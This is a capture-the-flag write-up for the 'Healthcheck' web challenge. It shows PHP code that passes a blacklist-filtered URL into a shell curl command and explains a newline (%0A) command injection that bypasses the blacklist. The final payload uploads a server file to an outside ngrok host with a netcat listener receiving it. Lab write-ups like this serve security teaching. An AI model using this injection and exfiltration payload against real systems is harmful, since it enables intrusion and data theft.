# Healthcheck (Web)

> I left my hopes_and_dreams on the server. can you help fetch it for me?
> 
- `index.php` – Source Code

# Solution

### Examining the Website

In this challenge, we’re given an input box where we can enter a URL through a POST request and check its response status code.

![image1](https://github.com/user-attachments/assets/0ab56dd9-26f3-4bef-be47-099f16bcecf4)

Examining the source code, we see that our input is first checked for any blacklisted characters, in which it will remove it. Afterwards, the sanitized URL is put through an explicit cURL command. From here, we can attempt to break out of the cURL command and run our own command to exfiltrate the file “hopes_and_dreams”, as mentioned in the challenge description.

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["url"])) {
    $url = $_POST["url"];

    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];

    $sanitized_url = str_replace($blacklist, '', $url);

    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";

    $output = shell_exec($command);
    if ($output) {
        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
    }
}
?>
```

### Exfiltrating the File

In order to do this, we’ll set up a ngrok server and forward it to our netcat listener on port 80.W

![image2](https://github.com/user-attachments/assets/d0d19b46-ebbd-4c91-a644-dd8de5a15cad)

> %0A is used to start a new line while bypassing blacklisted character restrictions, and -F is used to specify the file we want to exfiltrate.
> 

Using Burp Suite to forward our request, we receive the file back on our netcat listener.And here, we obtain the flag:

![image3](https://github.com/user-attachments/assets/2715dfb3-66b3-4ce5-b07e-1e8f13e6765c)

```php
sudo nc -nvlp 80
```

![image4](https://github.com/user-attachments/assets/aefc158a-c3bf-4180-89ba-5308c3f7b381)

And here, we obtain the flag:

```
umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}
```

# Conclusion
This will be the final payload for the URL:

```php
url=%0Acurl -F "file=@hopes_and_dreams" https://376f-211-24-127-165.ngrok-free.app
```

This challenge involves a response code checking website that sends user input through a cURL command. By escaping the cURL command using a URL encoded new line, %0A, we can solve this challenge by exfiltrating the file through the use of a crafted request and a ngrok server. The flag is obtained when the request is forwarded to our netcat listener.
